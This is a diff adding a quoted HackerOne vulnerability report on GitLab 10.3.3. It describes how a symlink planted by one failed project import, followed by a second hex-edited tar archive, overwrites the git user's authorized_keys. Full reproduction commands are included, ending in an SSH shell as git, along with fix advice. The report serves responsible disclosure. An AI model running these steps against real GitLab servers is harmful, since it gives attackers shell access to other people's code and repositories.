@@ -1,0 +1,82 @@
+'From `@briann` in https://hackerone.com/bugs?report_id=302959&subject=gitlab:
+
+GitLab is vulnerable to remote command execution via a directory traversal vulnerability in the project import feature. By using specially crafted tar files an attacker can overwrite any file owned by the git user, including that user's SSH authorized_keys and config files, resulting in remote shell access.
+
+This exploit was tested against GitLab CE and EE version 10.3.3.
+
+Description:
+
+This vulnerability has two primary causes:
+
+GitLab's project import feature re-uses temporary directories for untar'ing project import files.
+GitLab's project import feature only removes symlinks after an import file is successfully un-archived.
+Using specially crafted tar files these two vulnerabilities can be combined to overwrite any file owned by the git user. The most effective method to exploit these vulnerabilities is to create two tar files. The first creates a symlink to the directory containing the file to overwrite and the second contains the file that will be used to perform the write. Crafting the second tar file in a way that does not overwrite the symlink with a directory is tricky, but details on how this can be accomplished are below.
+
+To be clear we first upload a project of type "GitLab export" that contains a symlink. This import must fail after the symlink is written to the temporary directory (otherwise the symlink will be removed). We then upload a second project of the same name and type that contains a file under the previous symlink. Because the directory is re-used the symlink will be followed.
+
+Steps To Reproduce:
+1) Create the first tar archive. This archive needs to contain two files: a symlink pointing to the directory we want write access to and a file that will cause tar to exit with an error, resulting in the remove_symlinks! method not executing and the symlink being left behind. In this case we include a block device file in the archive. When tar encounters this file it will be unable to create the block device (tar is not run as root) and exit with an error.
+
+```sh
+$ ln -s /var/opt/gitlab/.ssh ssh
+$ sudo mknod test-fail b 8 0
+$ ls -la
+total 0
+drwxr-xr-x   4 test    staff       128 Jan  6 18:51 .
+drwxr-xr-x+ 20 test    staff       640 Jan  6 18:50 ..
+lrwxr-xr-x   1 test    staff        20 Jan  6 18:50 ssh -> /var/opt/gitlab/.ssh
+brw-r--r--   1 root    staff    0,   0 Jan  6 18:51 test-fail
+$ tar -czf ../first.tgz *
+```
+
+2) Create the second tar archive. This archive will contain a two files. The first exists solely to allow the files to be extracted regardless of any errors. The second is named after our target file and contains the content we want to write. In this case we want to overwrite /var/opt/gitlab/.ssh/authorized_keys file. Inside this file we place our public SSH key. This file must be mode 600 or sshd will ignore it.
+
+```sh
+$ touch foo                   # this may seem meaningless but I found that without a file preceding the directory entry the `authorized_keys` file might not be extracted before `tar` exits.
+$ mkdir ssh
+$ cd ssh
+$ vi authorized_keys          # add our SSH key here
+$ chmod 600 authorized_keys
+$ ls -la
+total 8
+drwxr-xr-x  3 test  staff   96 Jan  6 18:53 .
+drwxr-xr-x  3 test  staff   96 Jan  6 18:52 ..
+-rw-------  1 test  staff  271 Jan  6 18:53 authorized_keys
+$ cd ..
+$ ls -la
+total 0
+drwxr-xr-x   4 test  staff  128 Jan  6 19:29 .
+drwxr-xr-x+ 22 test  staff  704 Jan  6 19:29 ..
+-rw-r--r--   1 test  staff    0 Jan  6 19:29 foo
+drwxr-xr-x   3 test  staff   96 Jan  6 19:29 ssh
+$ tar -cf ../second.tar *     # we don't want it compressed so we can hex edit it
+```
+Now if we try to upload this second file as-is we will see that tar will overwrite the symlink with a directory, blocking our exploit. To prevent this from happening we either need to remove the directory itself from the archive or find a way to prevent tar from successfully extracting the directory. As it turns out this is easy to accomplish with a hex editor. Changing the directory name in the tar archive will cause the checksum for that directory to fail and cause the directory entry to be ignored. The file inside the directory will then be extracted across the symlink. tar will exit with an error again but the damage is already done.
+
+3) Open the second archive in a hex editor (this can also be done with vim). I used XCode. Open the file in XCode, hit command->shift->J, right-click on the file and choose to edit as hex. Find the ssh directory entry and rename it to ssy then save.
+
+4) compress the archive or GitLab won't accept it.
+
+```sh
+$ gzip second.tar
+```
+5) Create a new project in GitLab. Choose "import project". Choose the "GitLab export" import type and upload the first archive. When the import fails, remove the project. After this completes we will see a directory of the name /var/opt/gitlab/gitlab-rails/shared/tmp/project_exports/<namespace>/<projectname> on the server that contains a symlink named ssh pointing to the git user's SSH config directory.
+
+6) Create another project of same type with the same user/group and project name but this time importing the second archive. When the import is processed the authorized_keys file for the git user will be overwritten with our key.
+
+7) Login as git to the GitLab server. You will be given a user shell.
+
+```sh
+$ ssh git@gitlab.example.com
+$ id
+uid=998(git) gid=998(git) groups=998(git)
+```
+Supporting Material/References:
+I've attached two sample tar files as a Proof-of-Concept. The first creates the symlink to /var/opt/gitlab/.ssh and the second contains a file named vulnerable that will be copied into the /var/opt/gitlab/.ssh directory.
+
+Note: This exploit as written here would not work against GitLab instances using the database to authorize SSH access. However, in that case other files can be overwritten for access including the SSH config file, the GitLab code itself, Rails secrets, user crontab, etc.
+
+Also: It might sound like the obvious solution is to delete the temporary import directory regardless of success or failure of the import, but this will not provide a complete fix. So long as the directory name is re-used the first tar archive could be designed to stall, allowing time for the second archive to be uploaded to the same location. It would be advisable instead to use random directory locations for all imports and to deny imports for any archive containing suspicious file types before they are written to the filesystem. Alternatively GitLab could use a file archive format that does not support dangerous file types.
+
+Impact
+An attacker with an account on the GitLab instance can gain shell access to the GitLab server with the permissions of the git user, allowing complete access to the application and repositories.
